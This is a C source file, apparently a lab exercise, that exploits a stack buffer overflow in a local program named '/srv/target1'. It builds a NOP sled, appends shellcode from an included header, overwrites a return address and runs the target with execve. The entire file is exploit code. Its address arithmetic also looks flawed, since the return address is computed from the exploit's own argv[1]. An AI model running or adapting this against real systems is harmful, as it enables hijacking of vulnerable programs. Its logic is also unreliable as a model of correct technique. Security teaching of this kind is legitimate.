#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target1"

const int BUFFER_SIZE = 500;
const int OFFSET_TO_RET = 8;
const int SHELLCODE_LENGTH = sizeof(shellcode) - 1;

int main(int argc, char *argv[]) {
    char *args[3];
    char *env[1];
    char buf[BUFFER_SIZE + OFFSET_TO_RET + 100];

    printf("Address of buf: %p\n", (void*)buf);
    printf("Address of argv[1]: %p\n", (void*)argv[1]);
    printf("Shellcode length: %d\n", SHELLCODE_LENGTH);

    memset(buf, '\x90', sizeof(buf));
    memcpy(buf + sizeof(buf) - SHELLCODE_LENGTH, shellcode, SHELLCODE_LENGTH);

    unsigned int return_address = (unsigned int)argv[1] + OFFSET_TO_RET + 100;
    printf("Chosen return address: 0x%x\n", return_address);

    *(unsigned int*)(buf + OFFSET_TO_RET - 4) = return_address;

    args[0] = TARGET;
    args[1] = buf;
    args[2] = NULL;
    env[0] = NULL;

    printf("Executing target program...\n");
    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");

    return 0;
}